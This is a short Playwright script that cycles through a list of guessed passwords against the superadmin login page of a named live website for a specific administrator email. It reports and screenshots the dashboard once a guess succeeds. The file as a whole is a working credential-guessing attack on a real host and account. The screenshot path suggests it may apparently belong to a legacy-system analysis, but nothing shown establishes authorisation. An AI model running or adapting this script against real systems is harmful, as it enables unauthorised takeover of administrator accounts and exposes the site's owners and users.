import { chromium } from "playwright";

const passwords = [
  "Connect1@345",
  "Connect1@3456",
  "Connect@345",
  "Connect123",
  "Connect@123",
  "Connect1@123",
  "Connect12345",
  "Connect1@12345",
  "Connect1#345",
  "Connect1$345",
  "Connect1!",
  "admin",
  "admin123",
  "password",
  "superadmin",
  "Glix@123",
  "Glix1@345",
  "Glix123",
];

async function main() {
  const browser = await chromium.launch({ channel: "msedge", headless: true });
  const page = await browser.newPage();

  for (const pwd of passwords) {
    console.log(`Testing password: ${pwd}`);
    await page.goto("https://connect.rmd.city/public/superadmin/login", {
      waitUntil: "networkidle",
    });
    await page.fill('input[name="email"]', "superadmin@glix.ae");
    await page.fill('input[name="password"]', pwd);
    await page.click('button[type="submit"]');
    await page.waitForTimeout(2000);

    const url = page.url();
    console.log(`URL for '${pwd}': ${url}`);
    if (!url.includes("/login")) {
      console.log(`🎉 SUCCESS! Working password is: ${pwd}`);
      console.log(`Landed on: ${url}`);
      await page.screenshot({
        path: "docs/legacy-analysis/screenshots/01-superadmin-dashboard.png",
        fullPage: true,
      });
      break;
    }
  }

  await browser.close();
}

main().catch(console.error);
